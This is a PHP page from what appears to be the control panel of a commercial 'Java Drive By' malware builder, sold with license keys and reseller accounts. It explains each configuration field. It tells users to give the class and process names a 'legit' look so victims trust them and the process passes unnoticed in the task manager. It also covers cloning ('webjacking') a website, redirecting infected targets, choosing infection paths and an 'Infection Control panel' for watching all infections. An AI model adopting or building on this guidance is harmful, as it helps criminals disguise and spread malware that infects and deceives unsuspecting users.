<?php 
	set_time_limit(500);
	// Protection
	if(!$mod_login->isLogged()) header('Location: '.$_SERVER['PHP_SELF'].'?p=home'); 
?>

<div align="center">
	<table  style="text-align: right;" cellspacing="4">
		<tr>
			<th>Field name</th>
			<th>Explanation</th>
		</tr>
		<tr>
			<td style="text-align: right;">License key :</td>
			<td>Enter your license key. He must be your license key and he must be valid for work.</td>
		</tr>
		<?php
		if($mod_login->isReseller($_SESSION['username']))
		{
		?>
		<tr>
			<td>For :</td>
			<td>Enter the name of your customer. That can be anything</td>
		</tr>
		<?php
		}
		?>
		<tr>
			<td style="text-align: right;">Name of Class :</td>
			<td>This name is showed to peoples. He must look "legit" to be more trusted.</td>
		</tr>
		<tr>
			<td style="text-align: right;">JDB Name : </td>
			<td>Is the final file name.</td>
		</tr>
		<tr>
			<td style="text-align: right;">Name :</td>
			<td>Is the name of the process. He appear on the target taskmanager so he must look legit.</td>
		</tr>
		<tr>
			<td style="text-align: right;">Webjacking :</td>
			<td>Enter the name of the website you want copy. <a href="http://en.wikibooks.org/wiki/The_Computer_Revolution/Internet/Hackers#Webjack" target="a_blank" style="text-decoration: none;">More information about WebJacking</a></td>
		</tr>
		<tr>
			<td style="text-align: right;">Redirection :</td>
			<td>When the target accept the Java Drive By, he is redirected to the targeted website.</td>
		</tr>
		<tr>
			<td style="text-align: right;">Download method :</td>
			<td> You can choose the "Normal" method, that allow you to customize that all time or choose a fixed link to your file.</td>
		</tr>
		<tr>
			<td style="text-align: right;">Infection panel :</td>
			<td>That allow you to choose if you need the Infection Control panel or not. The ICP allow you to watch all infections.</td>
		</tr>
		<tr>
			<td style="text-align: right;">Infection path :</td>
			<td>Is the infection path repertory. You have only three choice.</td>
		</tr>
	</table>
</div>